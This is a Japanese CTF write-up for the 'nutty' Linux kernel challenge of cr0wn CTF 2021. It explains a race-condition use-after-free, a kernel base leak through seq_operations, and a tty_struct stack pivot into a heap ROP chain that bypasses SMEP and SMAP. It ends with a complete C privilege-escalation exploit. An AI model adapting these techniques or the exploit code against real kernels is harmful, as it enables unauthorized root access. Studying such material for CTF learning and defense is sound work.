keywords
kernel exploit, race without uffd, SLOB, seq_operations, tty_struct, bypass SMAP

# イントロ
いつぞや開催された**cr0wn CTF 2021**。そのpwn問題である**nutty**。先に言ってしまうと、localでrootが取れたもののremoteで動かなかったためflagは取れませんでした。。。。。。。
今これを書いているのが日曜日の夜9:30のため、あとCTFは6時間くらいあって、その間にremoteで動くようにデバッグしろやと自分自身でも思っているんですが、ねむねむのらなんにゃんこやねんになってしまったため、寝ます。起きたら多分CTF終わってるので、忘却の彼方に行く前に書き残しときます。感想を言っておくと、今まで慣れ親しんできたkernel問とはconfigが結構違うくて、辛かったです。
**あとでちゃんと復習して、remoteでもちゃんと動くようなexploitに書き直しときます**。

# static
## basic
```basic.sh
/ $ cat /proc/version
Linux version 5.10.17 (p4wn@p4wn) (gcc (GCC) 10.2.0, GNU ld (GNU Binutils) 2.35) #3 SMP Thu Feb 18 21:52:1
/ $ lsmod
vulnmod 16384 0 - Live 0x0000000000000000 (O)

timeout qemu-system-x86_64 \
        -m 128 \
        -kernel bzImage \
        -initrd initramfs.cpio \
        -nographic \
        -smp 1 \
        -cpu kvm64,+smep,+smap \
        -append "console=ttyS0 quiet kaslr" \
        -monitor /dev/null \
```
SMEP有効・SMAP有効・KASLR有効・KAISER有効・FGKASLR無効。

## module
ソースコードが配布されている。最高。`nut`という構造体があり、ユーザから提供されたデータを保持するノートみたいな役割を果たす。

# Vuln
## kUAF / double fetch
```vulnmod.c
static int append(req* arg){ 
    int idx = read_idx(arg);
    if (idx < 0 || idx >= 10){
        return -EINVAL;
    }
    if (nuts[idx].contents == NULL){
        return -EINVAL;
    }

    int new_size = read_size(arg) + nuts[idx].size;
    if (new_size < 0 || new_size >= 1024){
        printk(KERN_INFO "bad new size!\n"); 
        return -EINVAL;
    }
    char* tmp = kmalloc(new_size, GFP_KERNEL); 
    memcpy_safe(tmp, nuts[idx].contents, nuts[idx].size);
    kfree(nuts[idx].contents); // A
    char* appended = read_contents(arg); // B
    if (appended != 0){
        memcpy_safe(tmp+nuts[idx].size, appended, new_size - nuts[idx].size); 
        kfree(appended); // C
    }
    nuts[idx].contents = tmp; // D
    nuts[idx].size = new_size;

    return 0;
}
```
ノートを書き足す際に`append()`関数が呼ばれる。この時、"A"において古いノートを一旦`kfree()`して、"B"で追加されたデータを`copy_from_user()`によってコピーした後、コピーに使った一時的な領域を"C"で`kfree()`している。この時、ノートの管理構造体である`nut`に対して新しいデータが実際につけ変わるのは"D"であり、"A"と"D"の間では`kfree()`された領域へのポインタが保持されたままになっている。よって、"A"と"D"の間で上手く処理をユーザランドに戻すことができれば、RaceConditionになる。

## invalid show size
```vulnmod-show.c
static int show(req* arg){ 
    int idx = read_idx(arg);
    if (idx < 0 || idx >= 10){
        return -EINVAL;
    }
    if (nuts[idx].contents == NULL){
        return -EINVAL;
    }
    copy_to_user(arg->show_buffer, nuts[idx].contents, nuts[idx].size);

    return 0;
}
```
ユーザが書き込んだデータをユーザランドに返す`show()`という関数がある。このモジュールではデータ読み込みの際に、データバッファ自体のサイズと実際に入力するデータ長を区別しているが、`copy_to_user()`においては実際のデータ長(`nut.content_length`)ではなく、バッファの長さ(`nut.size`)を利用している。よって、短いデータを大きいバッファに入れることで初期化されていないheap内のデータを読むことができ、容易にheapアドレス等のleakができる。


# leak kernbase
## race via userfaultfd (FAIL)
これだったら、いつもどおりuffdでraceを安定させて終わりじゃーんと最初に問題を見たときには思った。だが、調べる内にこのkernelには**想定外のことが3つ**あった。
1つ目。uffdが無効になっている。呼び出すと、Function not Implementedと表示されるだけ。よって、uffdによってraceを安定化させるということはできない。
```not-exist-uffd.sh
/ # cat /proc/kallsyms | grep userfaultfd
ffffffffad889df0 W __x64_sys_userfaultfd
ffffffffad889e00 W __ia32_sys_userfaultfd
```
2つ目。スラブアロケータがSLUBじゃない。heapを見てみると、見慣れたSLUBと構造が異なっていた。恐らくこれはSLOBである。そして、ぼくはSLOBの構造をよく知らない。なんかキャッシュが大中小の3パターンでしか分かれていないというのと、objectの終わりの方に次へのポインタがあるっていうことくらい。
3つ目。`modprobe_path`がない。なんかあってもmodprobe_path書き換えれば終わりだろ〜と思っていたが、これまた検討が外れた。

## race to leak kernbase without uffd (Success)
uffdが使えないため、素直にraceを起こすことにした。利用する構造体は`seq_operations`。大まかな流れは以下のとおり。
```leak-concept.txt
1. 0x20サイズのnutをcreate
2. 1で作ったnutに対してsize:0x100,content_length:0でひたすらにappendし続ける
3. 別スレッドにおいて1で作ったnutからひたすらにopen(/proc/self/stat)とshowを交互にする
4. 上手くタイミングが噛み合い、appendの途中で3のスレッドにスイッチした場合、kfreeされたnutをseq_operationsとして確保できる。よって、これをshowすることでポインタがleakできる。
```
これで、kernbaseのleak完了。

# get RIP
RIPの取得も、kernbaseのleakとほぼ同じようにraceさせることでできる。今回は`tty_struct`を使った。

# bypass SMAP via kROP in kernel heap
RIPを取れたは良いが、今回はSMAP/SMEP/KPTI有効というフル機構である。SMEP有効のためuserlandのshellcodeは動かせないし、SMAP有効のためuserlandにstack pivotしてkROPすることもできない。また、`modprobe_path`も存在しないため書き換えだけでrootを取ることもできない。ここでかなり悩んで時間を使ってしまった。
最終的に、`tty_struct`内の関数ポインタを書き換えてgadgetに飛んだ時に、RBPが`tty_struct`自身を指していることが分かった。そのため、`leave, ret`するgadgetに飛ぶことで、RSPを`tty_struct`、すなわちkernel heapに向けることができる。但し、この`tty_struct`は既にRIPを取るために使ったペイロードが入っている。よって、**このペイロードも含めてkROPとして成立するようなkROP chain**を組む必要があった。最終的に`tty_struct`は以下のようなペイロードとchainを含んだ構造になった。
<ここにペイロードのイメージ図>

# remoteでrootが取れないぽよ。。。 (FAIL)
これでローカル環境においてシェルが取れたが、リモート環境においてどうしてもシェルが取れなかった。多分、ローカルで動いているということは、ちょっと調整をするだけで取れるような気もするが、ローカルで動かすまでにかなり精神を摩耗させてしまったためremoteでシェルを取ることは叶わなかった。悲しいね。。。

# exploit
ローカルでは**3回に1回くらいの確率**でrootが取れる。但し、remoteでは取れなかった。remoteとlocalの違いと言えば、最初にプログラムをsend/decompressするかくらいなため、そこになんか重要な違いでもあったのかなぁ。多分初期のheap状態とかだと思うんですが、如何せんSLOBよく知らんし、調べる気力もCTF中は失われてしまった。。。
```exploit-only-work-in-local.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/nutty"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  puts("[!!!] REACHED NIRUGIRI");
  int ruid, euid, suid;
  getresuid(&ruid, &euid, &suid);
  //if(euid != 0)
  //  errExit("[ERROR] FAIL");
  system("/bin/sh");
  //char *argv[] = {"/bin/sh",NULL};
  //char *envp[] = {NULL};
  //execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

/** nutty **/
// commands
#define NUT_CREATE 0x13371
#define NUT_DELETE 0x13372
#define NUT_SHOW 0x13373
#define NUT_APPEND 0x13374

// type
struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
};

// globals
uint count = 0;
void *faultmp = 0;
int nutfd;
ulong total_try = 0;
char buf[0x400];
ulong kernbase;
uint second_size = 0x2e0;
ulong prover = 0;
ulong *chain = 0;

// wrappers
int _create(int fd, uint size, uint csize, char *data){
  //printf("[+] create: %lx, %lx, %p\n", size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  assert(count < 10);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data
  };
  return ioctl(fd, NUT_CREATE, &myreq);
}

int _show(int fd, uint idx, char *buf){
  //printf("[+] show: %lx, %p\n", idx, buf);
  assert(fd > 0);
  struct req myreq ={
    .idx = idx,
    .show_buffer = buf
  };
  return ioctl(fd, NUT_SHOW, &myreq);
}

int _delete(int fd, uint idx){
  //printf("[+] delete: %x\n", idx);
  assert(fd > 0);
  struct req myreq = {
    .idx = idx,
  };
  return ioctl(fd, NUT_DELETE, &myreq);
}

int _append(int fd, uint idx, uint size, uint csize, char *data){
  //printf("[+] append: %x, %x %x, %p\n", idx, size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data,
    .idx = idx
  };
  return ioctl(fd, NUT_APPEND, &myreq);
}
/** (END nutty) **/


int leaked = -1;
ulong delete_count = 0;
ulong append_count = 0;
uint target_idx = 0;
ulong current_cred;

static void* shower(void *arg){
  char rbuf[0x200];
  memset(rbuf, 0, 0x200);
  int result;
  int tmpfd;
  ulong shower_counter = 0;
  while(leaked == -1){
    // kUAFできていた場合に備えてseq_operationsを確保
    tmpfd = open("/proc/self/stat", O_RDONLY);
    result = _show(nutfd, 0, rbuf);
    if(result < 0){ // idx0が存在しない
      close(tmpfd);
      continue;
    }
    // idx0が入れたはずの値じゃなければkUAF成功 
    if(((ulong*)rbuf)[0] != 0x4141414141414141){
      leaked = 1;
      puts("[!] LEAKED!");
      for(int ix=0; ix!=4;++ix){
        printf("[!] 0x%lx\n", ((ulong*)rbuf)[ix]);
      }
      break;
    }
    // seq_operations解放(やらないとmemory outof memory)
    close(tmpfd);
    if(shower_counter % 0x1000 == 0){
      printf("[-] shower: 0x%lx, 0x%lx\n", shower_counter, ((ulong*)rbuf)[0]);
    }
    ++shower_counter;
  }
  puts("[+] shower returning...");
  return (void*)((ulong*)rbuf)[0];
}

static void* appender(void *arg){
  int result = 0;
  char wbuf[0x200];
  memset(wbuf, 'A', 0x200);
  while(leaked == -1){
    result = _append(nutfd, target_idx, 0x0, 0x1, wbuf);
    if(result >= 0){
      ++append_count;
      if(append_count % 0x100 == 0)
        printf("[-] append: 0x%lx\n", append_count);
    }
  }
  puts("[+] appender returning...");
}

static void* writer(void *arg){
  char rbuf[0x400];
  int result;
  int tmpfd;
  ulong writer_counter = 0;

  while(leaked == -1){
    // kUAFできていた場合に備えてtty_structを確保
    tmpfd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    result = _show(nutfd, target_idx, rbuf);
    if(result < 0){ // idx0が存在しなy
      close(tmpfd);
      continue;
    }
    // idx0が入れたはずの値じゃなければkUAF成功 
    if(((ulong*)rbuf)[0] != 0x4242424242424242){
      leaked = 1;
      // do my businness first
      _delete(nutfd, target_idx);

      // gen chain
      chain = (ulong*)((ulong)rbuf + 8);
      *chain++ = kernbase + 0x14ED59; // pop rdi, pop rsi // MUST two pops
      *chain++ = ((ulong*)rbuf)[2];
      *chain++ = ((ulong*)rbuf)[7] & ~0xFFFUL;  // this is filled by tty_struct's op

      *chain++ = kernbase + 0x001BDD; // 0xffffffff81001bdd: pop rdi ; ret  ;  (6917 found)
      *chain++ = 0;
      *chain++ = kernbase + 0x08C3C0; // prepare_kernel_cred
      *chain++ = kernbase + 0x0557B5; // pop rcx
      *chain++ = 0;
      *chain++ = kernbase + 0xA2474B; // mov rdi, rax, rep movsq
      *chain++ = kernbase + 0x08C190; // commit_creds

      *chain++ = kernbase + 0x0557b5; // pop rcx
      *chain++ = kernbase + 0x00CF31; // [starter] leave

      //*chain++ = kernbase + 0x0557b5; // pop rcx
      //*chain++ = 0xBBBBBBBBBBBBB;
      //*chain++ = kernbase + 0xC00E26; // swapgs 0xffffffff81c00e26 mov rdi,cr3 (swapgs_restore_regs_and_return_to_usermode)
      *chain++ = kernbase + 0xc00e06;

      *chain++ = 0xEEEEEEEEEEEEEEEE;
      *chain++ = kernbase + 0x0AD147; // 0xffffffff81026a7b: 48 cf iretq
      *chain++ = &NIRUGIRI;
      *chain++ = user_cs; //XXX
      *chain++ = user_rflags;
      *chain++ = user_sp;
      *chain++ = user_ss;

      //*chain++ = 0xAAAAAAAAAAAAA;
      //*chain++ = 0xBBBBBBBBBBBBB;
      //*chain++ = 0xEEEEEEEEEEEEEEEE;
      //*chain++ = 0xAAAAAAAAAAAAA;
      //*chain++ = 0xBBBBBBBBBBBBB;
      //*chain++ = 0xCCCCCCCCCCCCC;
      //*chain++ = 0xDDDDDDDDDDDDD;

      //*chain++ = kernbase + 0x0AD147; // 0xffffffff81026a7b: 48 cf iretq
      //*chain++ = &NIRUGIRI;
      //*chain++ = user_cs; //XXX
      //*chain++ = user_rflags;
      //*chain++ = user_sp;
      ////*chain++ = user_ss;

      //*chain++ = 0xEEEEEEEEEEEEEEEE;
      //*chain++ = 0xAAAAAAAAAAAAA;
      //*chain++ = 0xBBBBBBBBBBBBB;
      //*chain++ = 0xCCCCCCCCCCCCC;
      //*chain++ = 0xDDDDDDDDDDDDD;

      setxattr("/tmp/exploit", "NIRUGIRI", rbuf, second_size, XATTR_CREATE);
      ioctl(tmpfd, 0, 0x13371337);

      assert(tmpfd > 0);
      return; // unreacableであってほしい
    }
    close(tmpfd);
    if(writer_counter % 0x1000 == 0){
      printf("[-] writer: 0x%lx, 0x%lx\n", writer_counter, ((ulong*)rbuf)[0]);
    }
    ++writer_counter;
  }
  puts("[+] writer returning...");
  return 0;
}

struct _msgbuf{
  long mtype;
  char mtext[0x30];
};
struct _msgbuf2e0{
  long mtype;
  char mtext[0x2e0];
};

int main(int argc, char *argv[]) {
  pthread_t creater_thr, deleter_thr, shower_thr, appender_thr, cad_thr, cder_thr, writer_thr;
  char rbuf[0x400];
  printf("[+] NIRUGIRI @ %p\n", &NIRUGIRI);
  memset(rbuf, 0, 0x200);
  memset(buf, 'A', 0x200);
  nutfd = open(DEV_PATH, O_RDWR);
  assert(nutfd > 0);
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  if(qid == -1) errExit("msgget");
  struct _msgbuf msgbuf = {.mtype = 1};
  struct _msgbuf2e0 msgbuf2e0 = {.mtype = 2};
  //KMALLOC(qid, msgbuf, 0x40);
  KMALLOC(qid, msgbuf2e0, 0x5);

  // leak kernbase
  _create(nutfd, 0x20, 0x20, buf);
  int appender_fd = pthread_create(&appender_thr, NULL, appender , 0);
  if(appender_fd > 0)
    errExit("appender_fd");
  int shower_fd = pthread_create(&shower_thr, NULL, shower, 0);
  if(shower_fd > 0)
    errExit("shower_fd");
  void *ret_shower;
  pthread_join(appender_thr, 0);
  pthread_join(shower_thr, &ret_shower);
  const ulong single_start = (ulong)ret_shower;
  kernbase = single_start - 0x1FA9E0;
  printf("[!] kernbase: 0x%lx\n", kernbase);

  // <until here, there is NO corruption //
  leaked = -1;
  target_idx = 1;
  memset(buf, 'B', 0x200);
  for(int ix=1; ix!=0x30; ++ix){
    ((ulong*)buf)[ix] = 0xdead00000 + ix*0x1000;
  }
  printf("[+] starting point: 0x%lx\n", kernbase + 0x00CF31);
  ((ulong*)buf)[0x60/8] = kernbase + 0x00CF31;

  _create(nutfd, second_size, second_size, buf);
  _create(nutfd, 0x2e0, 0x2e0, buf);

  save_state();
  appender_fd = pthread_create(&appender_thr, NULL, appender , 0);
  if(appender_fd > 0)
    errExit("appender_fd");
  int writer_fd = pthread_create(&writer_thr, NULL, writer, 0);
  if(writer_fd > 0)
    errExit("writer_fd");
  pthread_join(appender_thr, 0);
  pthread_join(writer_thr, 0);

  NIRUGIRI();
  return 0;
}
```

# アウトロ
<ここにlocal rootの画像ぽよ>

最近kernel問をちょこちょこ解いていたから、ちゃんとCTF開催期間中にremoteでrootを取りたかった。
ちゃんと寝たあとに、**復習してちゃんと動くexploitを書き直す**。
おやすみなさい。。。


# 参考
ニルギリ
https://youtu.be/yvUvamhYPHw
